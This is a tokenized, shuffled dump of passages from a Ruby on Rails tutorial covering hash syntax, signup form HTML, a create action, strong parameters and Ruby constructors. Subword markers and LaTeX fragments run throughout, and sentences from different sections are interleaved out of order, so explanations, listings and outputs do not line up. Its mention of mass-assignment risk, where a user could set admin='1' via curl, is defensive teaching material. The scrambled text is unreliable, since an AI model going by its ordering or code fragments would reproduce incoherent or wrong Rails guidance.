▁If ▁you ▁look ▁at ▁the ▁HTML ▁for ▁the ▁generated ▁form ▁by ▁ Ctrl - click ing ▁and ▁using ▁the ▁`` inspect ▁element '' ▁function ▁of ▁your ▁browser , ▁the ▁page ' s ▁source ▁should ▁look ▁something ▁like ▁Listing ~\ ref { code : signup _ form _ html }.
▁Let ' s ▁take ▁a ▁moment ▁to ▁discuss ▁its ▁structure .
▁The ▁second ▁syntax ▁replace s ▁the ▁symbol / h ashrocket ▁combination ▁with ▁the ▁name ▁of ▁the ▁key ▁followed ▁by ▁a ▁co lo n ▁and ▁a ▁value :
▁The ▁HTML ▁for ▁the ▁form ▁in ▁F igure ~\ ref { fig : signup _ form }.
▁This ▁construction ▁more ▁close ly ▁follows ▁the ▁hash ▁notation ▁in ▁other ▁languages ▁( such ▁as ▁JavaScript ) ▁and ▁ en j o y s ▁g row ing ▁popular ity ▁in ▁the ▁Rails ▁community .
▁Because ▁both ▁hash ▁syntax es ▁are ▁ still ▁in ▁common ▁use , ▁it ' s ▁essential ▁to ▁be ▁able ▁to ▁recognize ▁both ▁of ▁them .
▁We ' ll ▁start ▁with ▁the ▁internal ▁structure ▁of ▁the ▁document .
▁U nfortunately , ▁this ▁can ▁be ▁confusing , ▁es pecially ▁since ▁\ k ode { : name } ▁is ▁valid ▁on ▁its ▁own ▁( as ▁a ▁stand al one ▁symbol ) ▁but ▁\ k ode { name : } ▁has ▁no ▁meaning ▁by ▁itself .
▁ Compar ing ▁Listing ~\ ref { code : signup _ form } ▁with ▁Listing ~\ ref { code : signup _ form _ html }, ▁we ▁see ▁that ▁the ▁ embedded ▁Ruby
▁The ▁bottom ▁line ▁is ▁that ▁\ k ode { : name ▁=> } ▁and ▁\ k ode { name : } ▁are ▁effective ly ▁the ▁same ▁\ emph { only ▁inside ▁literal ▁hashes }, ▁so ▁that
▁produce s ▁the ▁HTML
▁are ▁equivalent , ▁but ▁otherwise ▁you ▁need ▁to ▁use ▁\ k ode { : name } ▁( with ▁the ▁co lo n ▁com ing ▁first ) ▁to ▁ de not e ▁a ▁symbol
▁As ▁seen ▁in ▁F igure ~\ ref { fig : filled _ in _ form }, ▁text ▁and ▁email ▁fields ▁(\ k ode { type =" text "} ▁and ▁\ line break ▁\ k ode { type =" email " }) ▁simply ▁display ▁their ▁contents , ▁whereas ▁password ▁fields ▁\ line break ▁(\ k ode { type =" password " }) ▁ ob sc ure ▁the ▁input ▁for ▁security ▁purposes , ▁as ▁seen ▁in ▁F igure ~\ ref { fig : filled _ in _ form }.
▁( The ▁benefit ▁of ▁using ▁an ▁email ▁field ▁is ▁that ▁some ▁systems ▁treat ▁it ▁different ly ▁from ▁a ▁text ▁field ; ▁for ▁example , ▁the ▁code ▁\ k ode { type =" email "} ▁will ▁cause ▁some ▁m ob i le ▁ dev ic es ▁to ▁display ▁a ▁special ▁key board ▁optimized ▁for ▁enter ing ▁email ▁addresses .)
▁A ▁ filled - in ▁form ▁with ▁\ k ode { text } ▁and ▁\ k ode { password } ▁fields .
▁As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : successful _ signup s }, ▁the ▁key ▁to ▁creating ▁a ▁user ▁is ▁the ▁special ▁\ k ode { name } ▁attribute ▁in ▁each ▁\ k ode { input } :
▁The ▁second ▁important ▁element ▁is ▁the ▁\ k ode { form } ▁tag ▁itself .
▁To get h er , ▁these ▁ const it ute ▁instructions ▁to ▁issue ▁an ▁HTTP ▁\ text tt { POST } ▁request ▁to ▁the ▁/ users ▁URL .
▁We ' ll ▁see ▁in ▁the ▁next ▁two ▁section s ▁what ▁effect s ▁this ▁has .
▁( You ▁may ▁also ▁have ▁notice d ▁the ▁code ▁that ▁appears ▁just ▁inside ▁the ▁\ k ode { form } ▁tag :
▁ Hash ▁values ▁can ▁be ▁virtual ly ▁anything , ▁even ▁other ▁hashes , ▁as ▁seen ▁in ▁Listing ~\ ref { code : nested _ hashes }.
▁This ▁code , ▁which ▁is n ' t ▁displayed ▁in ▁the ▁browser , ▁is ▁used ▁internally ▁by ▁Rails , ▁so ▁it ' s ▁not ▁important ▁for ▁us ▁to ▁understand ▁what ▁it ▁does .
▁Nest ed ▁hashes .
▁See ▁\ href { http :// stack overflow . com / questions / 9 4 1 59 4 / un d ers t and - rails - authenticity - token }{ the ▁S t ac k ▁Over flow ▁entry ▁on ▁the ▁Rails ▁ authenticity ▁token } ▁if ▁you ' re ▁interest ed ▁in ▁the ▁details ▁of ▁how ▁this ▁works .
▁A lthough ▁we ' ve ▁brief ly ▁examine d ▁the ▁HTML ▁for ▁the ▁form ▁in ▁F igure ~\ ref { fig : signup _ form } ▁( show n ▁in ▁Listing ~\ ref { code : signup _ form _ html }), ▁we ▁have n ' t ▁yet ▁covered ▁any ▁details , ▁and ▁the ▁form ▁is ▁best ▁under st ood ▁in ▁the ▁context ▁of ▁\ emph { signup ▁failure }.
▁=> ▁ { : name =>" Michael ▁Hartl ", ▁: email =>" mhartl @ example . com "}
▁In ▁this ▁section , ▁we ' ll ▁create ▁a ▁signup ▁form ▁that ▁accept s ▁an ▁invalid ▁submission ▁and ▁re - render s ▁the ▁signup ▁page ▁with ▁a ▁list ▁of ▁errors , ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : signup _ failure _ mockup }.
▁=> ▁ { : user => { : name =>" Michael ▁Hartl ", ▁: email =>" mhartl @ example . com "} }
▁A ▁mockup ▁of ▁the ▁signup ▁failure ▁page .
▁\ label { fig : signup _ failure _ mockup } }< n >\ end { figure }< n >< n > ▁\ subsection { A ▁working ▁form } ▁% ▁( fold )< n > ▁\ label { sec : a _ working _ form }< n >< n >
▁These ▁sort s ▁of ▁hashes - of - hashes , ▁or ▁\ emph { nested ▁hashes }, ▁are ▁heav ily ▁used ▁by ▁Rails , ▁as ▁we ' ll ▁see ▁starting ▁in ▁Section ~\ ref { sec : unsuccessful _ signup s }.
▁Recall ▁from ▁Section ~\ ref { sec : a _ users _ resource } ▁that ▁adding ▁\ k ode { resources ▁: users } ▁to ▁the ▁\ k ode { routes . rb } ▁file ▁( Listing ~\ ref { code : users _ resource }) ▁automatically ▁ensure s ▁that ▁our ▁Rails ▁application ▁respond s ▁to ▁the ▁RESTful ▁URLs ▁from ▁Table ~\ ref { table : RESTful _ users }.
▁As ▁with ▁arrays ▁and ▁range s , ▁hashes ▁respond ▁to ▁the ▁\ k ode { each } ▁method .
▁In ▁particular , ▁it ▁ensure s ▁that ▁a ▁\ text tt { POST } ▁request ▁to ▁/ users ▁is ▁handle d ▁by ▁the ▁\ k ode { create } ▁action .
▁For ▁example , ▁consider ▁a ▁hash ▁named ▁\ k ode { flash } ▁with ▁keys ▁for ▁two ▁conditions , ▁\ k ode { : success } ▁and ▁\ k ode { : danger } :
▁Ou r ▁strategy ▁for ▁the ▁\ k ode { create } ▁action ▁is ▁to ▁use ▁the ▁form ▁submission ▁to ▁make ▁a ▁new ▁user ▁object ▁using ▁\ k ode { User . new }, ▁try ▁( and ▁fail ) ▁to ▁save ▁that ▁user , ▁and ▁the n ▁render ▁the ▁signup ▁page ▁for ▁possible ▁re submission .
▁" It ▁work ed !"
▁Let ' s ▁get ▁started ▁by ▁review ing ▁the ▁code ▁for ▁the ▁signup ▁form :
▁It ▁failed .
▁As ▁noted ▁in ▁Section ~\ ref { sec : the _ form _ html }, ▁this ▁HTML ▁issues ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁/ users ▁URL .
▁Ou r ▁first ▁step ▁toward ▁a ▁working ▁signup ▁form ▁is ▁adding ▁the ▁code ▁in ▁Listing ~\ ref { code : first _ create _ action }.
▁This ▁list ing ▁includes ▁a ▁second ▁use ▁of ▁the ▁\ k ode { render } ▁method , ▁which ▁we ▁first ▁saw ▁in ▁the ▁context ▁of ▁partials ▁( Section ~\ ref { sec : partial s }) ; ▁as ▁you ▁can ▁see , ▁\ k ode { render } ▁works ▁in ▁controller ▁actions ▁as ▁well .
▁ K e y ▁: success ▁has ▁value ▁" It ▁work ed !"
▁Note ▁that ▁we ' ve ▁take n ▁this ▁opportunit y ▁to ▁introduce ▁an ▁\ k ode { if } - \ k ode { else } ▁branch ing ▁structure , ▁which ▁allows ▁us ▁to ▁handle ▁the ▁cases ▁of ▁failure ▁and ▁ success ▁separate ly ▁base d ▁on ▁the ▁value ▁of ▁\ k ode {@ user . save }, ▁which ▁( as ▁we ▁saw ▁in ▁Section ~\ ref { sec : creating _ user _ objects }) ▁is ▁either ▁\ k ode { true } ▁or ▁\ k ode { false } ▁depending ▁on ▁whether ▁or ▁not ▁the ▁save ▁succeed s .
▁A ▁\ k ode { create } ▁action ▁that ▁can ▁handle ▁signup ▁failure .
▁Note ▁that , ▁while ▁the ▁\ k ode { each } ▁method ▁for ▁arrays ▁take s ▁a ▁block ▁with ▁only ▁one ▁variable , ▁\ k ode { each } ▁for ▁hashes ▁take s ▁two , ▁a ▁\ emph { key } ▁and ▁a ▁\ emph { value }.
▁Thus , ▁the ▁\ k ode { each } ▁method ▁for ▁a ▁hash ▁iterate s ▁through ▁the ▁hash ▁one ▁key - value ▁\ emph { p a ir } ▁at ▁a ▁time .
▁The ▁last ▁example ▁uses ▁the ▁useful ▁\ k ode { inspect } ▁method , ▁which ▁returns ▁a ▁string ▁with ▁a ▁literal ▁representation ▁of ▁the ▁object ▁it ' s ▁called ▁on :
▁[1, ▁2, ▁3 , ▁4 , ▁5 ]
▁# ▁H and le ▁a ▁successful ▁save .
▁Note ▁the ▁comment : ▁this ▁is ▁not ▁the ▁final ▁implementation .
▁It ▁work ed !
▁But ▁it ' s ▁enough ▁to ▁get ▁us ▁started , ▁and ▁we ' ll ▁finish ▁the ▁implementation ▁in ▁Section ~\ ref { sec : strong _ parameters }.
▁The ▁best ▁way ▁to ▁understand ▁how ▁the ▁code ▁in ▁Listing ~\ ref { code : first _ create _ action } ▁works ▁is ▁to ▁\ emph { submit } ▁the ▁form ▁with ▁some ▁invalid ▁signup ▁data .
▁By ▁the ▁way , ▁using ▁\ k ode { inspect } ▁to ▁ print ▁an ▁object ▁is ▁common ▁enough ▁that ▁there ' s ▁a ▁shortcut ▁for ▁it , ▁the ▁\ k ode { p } ▁function
▁The ▁result ▁appears ▁in ▁F igure ~\ ref { fig : signup _ failure }, ▁and ▁the ▁full ▁debug ▁information ▁( with ▁an ▁increase d ▁font ▁size ) ▁appears ▁in ▁F igure ~\ ref { fig : signup _ failure _ rails _ debug }.
▁There ' s ▁actually ▁a ▁subtle ▁difference , ▁which ▁is ▁that ▁\ k ode { p } ▁returns ▁the ▁object ▁being ▁ print ed ▁while ▁\ k ode { put s } ▁always ▁returns ▁\ k ode { nil }.
▁( F igure ~\ ref { fig : signup _ failure } ▁also ▁shows ▁the ▁\ emph { web ▁console }, ▁which ▁open s ▁a ▁Rails ▁console ▁in ▁the ▁browser ▁to ▁assist ▁in ▁debugging .
▁( T hanks ▁to ▁reader ▁ K at ar z y n a ▁S i we k ▁for ▁point ing ▁this ▁out .)
▁It ' s ▁useful ▁for ▁examining , ▁e . g . , ▁the ▁User ▁model , ▁but ▁in ▁this ▁case ▁we ▁need ▁to ▁ inspect ▁\ k ode { params }, ▁which ▁is ▁not ▁available ▁in ▁the ▁web ▁console ▁as ▁far ▁as ▁I ▁can ▁tell .)
▁Signup ▁failure .
▁< n >\ end { code }< n >< n > ▁% ▁subsection ▁hashes _ and _ symbol s ▁( end )< n >< n > ▁\ subsection { CSS ▁ revisited } ▁% ▁( fold )< n > ▁\ label { sec : css _ revisited }< n >< n >
▁It ' s ▁time ▁now ▁to ▁re visit ▁the ▁line ▁from ▁Listing ~\ ref { code : application _ layout _ redux } ▁used ▁in ▁the ▁layout ▁to ▁include ▁the ▁cascad ing ▁style ▁ sheet s :
▁Signup ▁failure ▁debug ▁information .
▁We ▁are ▁now ▁ nearly ▁in ▁a ▁position ▁to ▁understand ▁this .
▁To ▁get ▁a ▁better ▁ picture ▁of ▁how ▁Rails ▁handle s ▁the ▁submission , ▁let ' s ▁take ▁a ▁close r ▁look ▁at ▁the ▁\ k ode { user } ▁part ▁of ▁the ▁parameters ▁hash ▁from ▁the ▁debug ▁information ▁( F igure ~\ ref { fig : signup _ failure _ rails _ debug }) :
▁As ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : motivation }, ▁Rails ▁defines ▁a ▁special ▁function ▁to ▁include ▁stylesheets , ▁and
▁This ▁hash ▁get s ▁passed ▁to ▁the ▁Users ▁controller ▁as ▁part ▁of ▁\ k ode { params }, ▁and ▁we ▁saw ▁starting ▁in ▁Section ~\ ref { sec : a _ users _ resource } ▁that ▁the ▁\ k ode { params } ▁hash ▁contains ▁information ▁about ▁each ▁request . ▁In ▁the ▁case ▁of ▁a ▁URL ▁like ▁/ users /1 , ▁the ▁value ▁of ▁\ k ode { params [: id ]} ▁is ▁the ▁\ k ode { id } ▁of ▁the ▁corresponding ▁user ▁(\ k ode {1} ~ in ▁this ▁example ).
▁is ▁a ▁call ▁to ▁this ▁function .
▁In ▁the ▁case ▁of ▁post ing ▁to ▁the ▁signup ▁form , ▁\ k ode { params } ▁instead ▁contains ▁a ▁hash ▁of ▁hashes , ▁a ▁construction ▁we ▁first ▁saw ▁in ▁Section ~\ ref { sec : hashes _ and _ symbol s }, ▁which ▁introduce d ▁the ▁ str ate g ical ly ▁named ▁\ k ode { params } ▁variable ▁in ▁a ▁console ▁session .
▁But ▁there ▁are ▁sever al ▁my s ter ies .
▁The ▁debug ▁information ▁above ▁shows ▁that ▁ submitting ▁the ▁form ▁results ▁in ▁a ▁\ k ode { user } ▁hash ▁with ▁attributes ▁corresponding ▁to ▁the ▁submitted ▁values , ▁where ▁the ▁keys ▁come ▁from ▁the ▁\ k ode { name } ▁attributes ▁of ▁the ▁\ k ode { input } ▁tags ▁seen ▁in ▁Listing ~\ ref { code : signup _ form } ; ▁for ▁example , ▁the ▁value ▁of
▁First , ▁where ▁are ▁the ▁parentheses ?
▁In ▁Ruby , ▁they ▁are ▁optional , ▁so ▁these ▁two ▁are ▁equivalent :
▁with ▁name ▁\ k ode {" user [ email ] "} ▁is ▁precise ly ▁the ▁\ k ode { email } ▁attribute ▁of ▁the ▁\ k ode { user } ▁hash .
▁# ▁P ar en the s es ▁on ▁function ▁calls ▁are ▁optional .
▁in ▁Listing ~\ ref { code : first _ create _ action }.
▁S ec on d , ▁the ▁\ k ode { m edia } ▁argument ▁sure ▁look s ▁like ▁a ▁hash , ▁but ▁where ▁are ▁the ▁ curl y ▁braces ?
▁This ▁means ▁that ▁the ▁line
▁When ▁hashes ▁are ▁the ▁\ emph { last } ▁argument ▁in ▁a ▁function ▁call , ▁the ▁ curl y ▁braces ▁are ▁optional , ▁so ▁these ▁two ▁are ▁equivalent :
▁is ▁most ly ▁equivalent ▁to
▁# ▁C ur ly ▁braces ▁on ▁final ▁hash ▁arguments ▁are ▁optional .
▁In ▁previous ▁versions ▁of ▁Rails , ▁using
▁actually ▁work ed , ▁but ▁it ▁was ▁in secure ▁by ▁default ▁and ▁required ▁a ▁careful ▁and ▁error - prone ▁ procedure ▁to ▁prevent ▁ malicious ▁users ▁from ▁ potentially ▁modify ing ▁the ▁application ▁database .
▁Next , ▁why ▁does ▁the ▁\ k ode { data - turbolinks - t rack } ▁key - value ▁pair ▁use ▁the ▁old - style ▁h ashrocket ▁syntax ?
▁This ▁is ▁because ▁using ▁the ▁new er ▁syntax ▁to ▁write
▁In ▁Rails ▁version ▁later ▁than ▁4.0 , ▁this ▁code ▁raise s ▁an ▁error ▁( as ▁seen ▁in ▁F igure ~\ ref { fig : signup _ failure } ▁and ▁F igure ~\ ref { fig : signup _ failure _ rails _ debug } ▁above ), ▁which ▁means ▁it ▁is ▁secure ▁by ▁default .
▁< n >< n > ▁% ▁subsection ▁a _ working _ form ▁( end )< n >< n > ▁\ subsection { S tr on g ▁parameters } ▁% ▁( fold )< n > ▁\ label { sec : strong _ parameters }< n >< n >
▁is ▁invalid ▁because ▁of ▁the ▁h y phens .
▁We ▁mentioned ▁brief ly ▁in ▁Section ~\ ref { sec : a _ user _ class } ▁the ▁idea ▁of ▁\ emph { mass ▁assignment }, ▁which ▁involve s ▁initializ ing ▁a ▁Ruby ▁variable ▁using ▁a ▁hash ▁of ▁values , ▁as ▁in
▁( Re c all ▁from ▁Section ~\ ref { sec : hashes _ and _ symbol s } ▁that ▁h y phens ▁can ' t ▁be ▁used ▁in ▁symbols .)
▁This ▁force s ▁us ▁to ▁use ▁the ▁older ▁syntax , ▁yield ing
▁The ▁comment ▁included ▁in ▁Listing ~\ ref { code : first _ create _ action } ▁and ▁re p r o d u c ed ▁above ▁indicates ▁that ▁this ▁is ▁not ▁the ▁final ▁implementation .
▁The ▁reason ▁is ▁that ▁initializ ing ▁the ▁entire ▁\ k ode { params } ▁hash ▁is ▁\ emph { extremely } ▁ danger ous --- it ▁arrange s ▁to ▁pass ▁to ▁\ k ode { User . new } ▁\ emph { all } ▁data ▁submitted ▁by ▁a ▁user .
▁F inally , ▁why ▁does ▁Ruby ▁correctly ▁interpret ▁the ▁lines
▁In ▁particular , ▁suppose ▁that , ▁in ▁addition ▁to ▁the ▁current ▁attributes , ▁the ▁User ▁model ▁included ▁an ▁\ k ode { admin } ▁attribute ▁used ▁to ▁identify ▁ administrative ▁users ▁of ▁the ▁site .
▁even ▁with ▁a ▁line ▁break ▁between ▁the ▁final ▁elements ?
▁( We ▁will ▁implement ▁just ▁such ▁an ▁attribute ▁in ▁Section ~\ ref { sec : administrative _ users }. )
▁The ▁an s w er ▁is ▁that ▁Ruby ▁does n ' t ▁distinguish ▁between ▁new line s ▁and ▁other ▁whitespace ▁in ▁this ▁context
▁The ▁way ▁to ▁set ▁such ▁an ▁attribute ▁to ▁\ k ode { true } ▁is ▁to ▁pass ▁the ▁value ▁\ k ode { admin =' 1 ' } ▁as ▁part ▁of ▁\ k ode { params [: user ]} , ▁a ▁task ▁that ▁is ▁easy ▁to ▁accomplish ▁using ▁a ▁command - line ▁HTTP ▁client ▁such ▁as ▁\ text tt { curl }.
▁A ▁new line ▁is ▁what ▁comes ▁at ▁the ▁end ▁of ▁a ▁line , ▁there by ▁starting ▁a ▁new ▁line .
▁The ▁\ emph { re as on } ▁I ▁chose ▁to ▁break ▁the ▁code ▁into ▁pieces ▁is ▁that ▁I ▁prefer ▁to ▁keep ▁lines ▁of ▁source ▁code ▁under ▁80 ▁characters ▁for ▁ le g i b il ity
▁The ▁result ▁would ▁be ▁that , ▁by ▁passing ▁in ▁the ▁entire ▁\ k ode { params } ▁hash ▁to ▁\ k ode { User . new }, ▁we ▁would ▁allow ▁any ▁user ▁of ▁the ▁site ▁to ▁gain ▁ administrative ▁access ▁by ▁including ▁\ k ode { admin =' 1 ' } ▁in ▁the ▁web ▁request .
▁ Actually ▁\ emph { count ing } ▁columns ▁could ▁d r ive ▁you ▁c ra z y , ▁which ▁is ▁why ▁many ▁text ▁editor s ▁have ▁a ▁ visual ▁a id ▁to ▁help ▁you .
▁P re v ious ▁versions ▁of ▁Rails ▁used ▁a ▁method ▁called ▁\ k ode { attr \_ accessible } ▁in ▁the ▁\ emph { model } ▁layer ▁to ▁solve ▁this ▁problem , ▁and ▁you ▁may ▁ still ▁see ▁that ▁method ▁in ▁ le g ac y ▁Rails ▁applications , ▁but ▁as ▁of ▁Rails ~4.0 ▁the ▁preferred ▁technique ▁is ▁to ▁use ▁so - called ▁\ emph { strong ▁parameters } ▁in ▁the ▁controller ▁layer .
▁For ▁example , ▁if ▁you ▁take ▁a ▁look ▁back ▁at ▁F igure ~\ ref { fig : cloud 9 _ gemfile }, ▁you ' ll ▁see ▁a ▁small ▁vertical ▁line ▁on ▁the ▁right ▁to ▁help ▁keep ▁code ▁under ▁80 ▁characters .
▁This ▁allows ▁us ▁to ▁specify ▁which ▁parameters ▁are ▁\ emph { require d } ▁and ▁which ▁one s ▁are ▁\ emph { permitted }.
▁The ▁cloud ▁IDE ▁( Section ~\ ref { sec : development _ environment }) ▁includes ▁such ▁a ▁line ▁by ▁default .
▁In ▁addition , ▁passing ▁in ▁a ▁raw ▁\ k ode { params } ▁hash ▁as ▁above ▁will ▁cause ▁an ▁error ▁to ▁be ▁raised , ▁so ▁that ▁Rails ▁applications ▁are ▁now ▁imm un e ▁to ▁ mass ▁assignment ▁vulnerabilities ▁by ▁default .
▁If ▁you ▁use ▁ TextMate , ▁you ▁can ▁find ▁this ▁feature ▁under ▁\ text tt { View ▁ > ▁W ra p ▁Co l um n ▁ > ▁ 78 }.
▁In ▁S ublime ▁Text , ▁you ▁can ▁use ▁\ text tt { View ▁ > ▁R ul er ▁ > ▁ 78 } ▁or ▁\ text tt { View ▁ > ▁R ul er ▁ > ▁80 }.
▁In ▁the ▁present ▁instance , ▁we ▁want ▁to ▁require ▁the ▁\ k ode { params } ▁hash ▁to ▁have ▁a ▁\ k ode { : user } ▁attribute , ▁and ▁we ▁want ▁to ▁ permit ▁the ▁name , ▁email , ▁password , ▁and ▁password ▁confirmation ▁attributes ▁( but ▁no ▁other s ).
▁So , ▁we ▁see ▁now ▁that ▁the ▁line
▁calls ▁the ▁\ k ode { stylesheet \_ link \_ tag } ▁function ▁with ▁two ▁arguments : ▁a ▁string , ▁indicat ing ▁the ▁path ▁to ▁the ▁stylesheet , ▁and ▁a ▁hash ▁with ▁two ▁elements , ▁indicat ing ▁the ▁m edia ▁type ▁and ▁tell ing ▁Rails ▁to ▁use ▁the ▁\ href { https :// github . com / rails / turbolinks }{ turbolinks } ▁feature ▁added ▁in ▁Rails ~4.0 .
▁This ▁code ▁returns ▁a ▁version ▁of ▁the ▁\ k ode { params } ▁hash ▁with ▁only ▁the ▁ permitted ▁attributes ▁( w h i le ▁rais ing ▁an ▁error ▁if ▁the ▁\ k ode { : user } ▁attribute ▁is ▁missing ).
▁( You ▁may ▁see ▁some ▁extra ▁things , ▁like ▁\ k ode { ? body = 1 }, ▁after ▁the ▁CSS ▁filename s .
▁To ▁facilit ate ▁the ▁use ▁of ▁these ▁parameters , ▁it ' s ▁conventional ▁to ▁introduce ▁an ▁aux i li ary ▁method ▁called ▁\ k ode { user \_ params } ▁( which ▁returns ▁an ▁appropriate ▁initialization ▁hash ) ▁and ▁use ▁it ▁in ▁place ▁of ▁\ k ode { params [: user ]} :
▁These ▁are ▁inserted ▁by ▁Rails ▁to ▁ensure ▁that ▁browsers ▁reload ▁the ▁CSS ▁when ▁it ▁changes ▁on ▁the ▁server .)
▁S ince ▁\ k ode { user \_ params } ▁will ▁only ▁be ▁used ▁internally ▁by ▁the ▁Users ▁controller ▁and ▁need ▁not ▁be ▁expose d ▁to ▁external ▁users ▁via ▁the ▁web , ▁we ' ll ▁make ▁it ▁\ emph { private } ▁using ▁Ruby ' s ▁\ k ode { private } ▁keyword , ▁as ▁show n ▁in ▁Listing ~\ ref { code : create _ action _ strong _ parameters }.
▁The ▁HTML ▁source ▁produce d ▁by ▁the ▁CSS ▁includes .
▁( We ' ll ▁discuss ▁\ k ode { private } ▁in ▁more ▁detail ▁in ▁Section ~\ ref { sec : remember _ me }. )
▁We ' ll ▁set ▁about ▁changing ▁this ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout }.
▁We ' ve ▁said ▁before ▁that ▁everything ▁in ▁Ruby ▁is ▁an ▁object , ▁and ▁in ▁this ▁section ▁we ' ll ▁finally ▁get ▁to ▁define ▁some ▁of ▁our ▁own .
▁Using ▁ strong ▁parameters ▁in ▁the ▁\ k ode { create } ▁action .
▁Ruby , ▁like ▁many ▁object - or i ent ed ▁languages , ▁uses ▁\ emph { classes } ▁to ▁ org an ize ▁methods ; ▁these ▁classes ▁are ▁the n ▁\ emph { instantiated } ▁to ▁create ▁objects .
▁If ▁you ' re ▁new ▁to ▁object - or i ent ed ▁programming , ▁this ▁may ▁ s ound ▁like ▁g i b b er is h , ▁so ▁let ' s ▁look ▁at ▁some ▁concrete ▁examples .
▁< n >< n >< n > ▁\ subsection { Co n str u c to r s } ▁% ▁( fold )< n > ▁\ label { sec : const ru c to r s }< n >< n >
▁We ' ve ▁seen ▁lot s ▁of ▁examples ▁of ▁using ▁classes ▁to ▁in st ant i ate ▁objects , ▁but ▁we ▁have ▁yet ▁to ▁do ▁so ▁explicitly .
▁For ▁example , ▁we ▁ instantiated ▁a ▁string ▁using ▁the ▁double ▁ quot e ▁characters , ▁which ▁is ▁a ▁\ emph { li ter al ▁construct or } ▁for ▁strings :
▁=> ▁ String
▁We ▁see ▁here ▁that ▁strings ▁respond ▁to ▁the ▁method ▁\ k ode { class }, ▁and ▁simply ▁return ▁the ▁class ▁they ▁be long ▁to .
▁Instead ▁of ▁using ▁a ▁literal ▁construct or , ▁we ▁can ▁use ▁the ▁equivalent ▁\ emph { name d ▁construct or }, ▁which ▁involve s ▁calling ▁the ▁\ k ode { new } ▁method ▁on ▁the ▁class ▁name
▁By ▁the ▁way , ▁the ▁extra ▁level ▁of ▁indentation ▁on ▁the ▁\ k ode { user \_ params } ▁method ▁is ▁design ed ▁to ▁make ▁it ▁ visual ly ▁apparent ▁which ▁methods ▁are ▁defined ▁after ▁\ k ode { private }.
▁These ▁results ▁will ▁var y ▁base d ▁on ▁the ▁version ▁of ▁Ruby ▁you ▁are ▁using .
▁( Experience ▁shows ▁that ▁this ▁is ▁a ▁ wise ▁practice ; ▁in ▁classes ▁with ▁a ▁large ▁number ▁of ▁methods , ▁it ▁is ▁easy ▁to ▁define ▁a ▁private ▁method ▁accidental ly , ▁which ▁lead s ▁to ▁consider able ▁confusion ▁when ▁it ▁is n ' t ▁available ▁to ▁call ▁on ▁the ▁corresponding ▁object .)
▁This ▁example ▁assume s ▁you ▁are ▁using ▁Ruby ~ 1.9.3 ▁or ▁later .
▁At ▁this ▁point , ▁the ▁signup ▁form ▁is ▁working , ▁at ▁least ▁in ▁the ▁sense ▁that ▁it ▁no ▁longer ▁produce s ▁an ▁error ▁upon ▁submission .
▁On ▁the ▁other ▁hand , ▁as ▁seen ▁in ▁F igure ~\ ref { fig : invalid _ submission _ no _ feed back }, ▁it ▁does n ' t ▁display ▁any ▁feedback ▁on ▁invalid ▁submission s ▁( a part ▁from ▁the ▁development - only ▁debug ▁are a ), ▁which ▁is ▁ potentially ▁confusing .
▁It ▁also ▁does n ' t ▁actually ▁create ▁a ▁new ▁user .
▁We ' ll ▁fix ▁the ▁first ▁issue ▁in ▁Section ~\ ref { sec : signup _ error _ messages } ▁and ▁the ▁second ▁in ▁Section ~\ ref { sec : successful _ signup s }.
▁This ▁is ▁equivalent ▁to ▁the ▁literal ▁construct or , ▁but ▁it ' s ▁more ▁explicit ▁about ▁what ▁we ' re ▁doing .
▁The ▁signup ▁form ▁submitted ▁with ▁invalid ▁information .
▁ Array s ▁work ▁the ▁same ▁way ▁as ▁strings :
▁=> ▁[1, ▁3 , ▁2 ]
▁As ▁a ▁final ▁step ▁in ▁handling ▁failed ▁user ▁creation , ▁we ' ll ▁add ▁helpful ▁error ▁messages ▁to ▁indicate ▁the ▁problem s ▁that ▁prevent ed ▁successful ▁signup .
▁ Hash es , ▁in ▁contrast , ▁are ▁different .
▁Co n ve n i ent ly , ▁Rails ▁automatically ▁provides ▁such ▁messages ▁base d ▁on ▁the ▁User ▁model ▁validations .
▁Whi le ▁the ▁array ▁construct or ▁\ k ode { Array . new } ▁take s ▁an ▁initial ▁value ▁for ▁the ▁array , ▁\ k ode { Hash . new } ▁take s ▁a ▁\ emph { default } ▁value ▁for ▁the ▁hash , ▁which ▁is ▁the ▁value ▁of ▁the ▁hash ▁for ▁a ▁non ex ist ent ▁key :
▁For ▁example , ▁consider ▁try ing ▁to ▁save ▁a ▁user ▁with ▁an ▁invalid ▁email ▁address ▁and ▁with ▁a ▁password ▁that ' s ▁too ▁short :
▁=> ▁[" E mail ▁is ▁invalid ", ▁" Password ▁is ▁too ▁short ▁( minimum ▁is ▁6 ▁characters ) "]
▁When ▁a ▁method ▁get s ▁called ▁on ▁the ▁class ▁itself , ▁as ▁in ▁the ▁case ▁of ▁\ k ode { new }, ▁it ' s ▁called ▁a ▁\ emph { class ▁method }.
▁The ▁result ▁of ▁calling ▁\ k ode { new } ▁on ▁a ▁class ▁is ▁an ▁object ▁of ▁that ▁class , ▁also ▁called ▁an ▁\ emph { instance } ▁of ▁the ▁class .
▁A ▁method ▁called ▁on ▁an ▁instance , ▁such ▁as ▁\ k ode { length }, ▁is ▁called ▁an ▁\ emph { instance ▁method }.
▁When ▁learning ▁about ▁classes , ▁it ' s ▁useful ▁to ▁find ▁out ▁the ▁\ emph { class ▁hierarchy } ▁using ▁the ▁\ k ode { super class } ▁method :
▁Here ▁the ▁\ k ode { errors . full \_ messages } ▁object ▁( which ▁we ▁saw ▁brief ly ▁before ▁in ▁Section ~\ ref { sec : presence _ validation }) ▁contains ▁an ▁array ▁of ▁error ▁messages .
▁As ▁in ▁the ▁console ▁session ▁above , ▁the ▁failed ▁save ▁in ▁Listing ~\ ref { code : first _ create _ action } ▁generates ▁a ▁list ▁of ▁error ▁messages ▁ associated ▁with ▁the ▁\ k ode {@ user } ▁object .
▁=> ▁Object
▁To ▁display ▁the ▁messages ▁in ▁the ▁browser , ▁we ' ll ▁render ▁an ▁error - messages ▁partial ▁on ▁the ▁user ▁\ k ode { new } ▁page ▁while ▁adding ▁the ▁CSS ▁class ▁\ k ode { form - control } ▁( which ▁has ▁special ▁meaning ▁to ▁Bootstrap ) ▁to ▁each ▁entry ▁field , ▁as ▁show n ▁in ▁Listing ~\ ref { code : f _ error _ messages }.
▁=> ▁B as ic Object
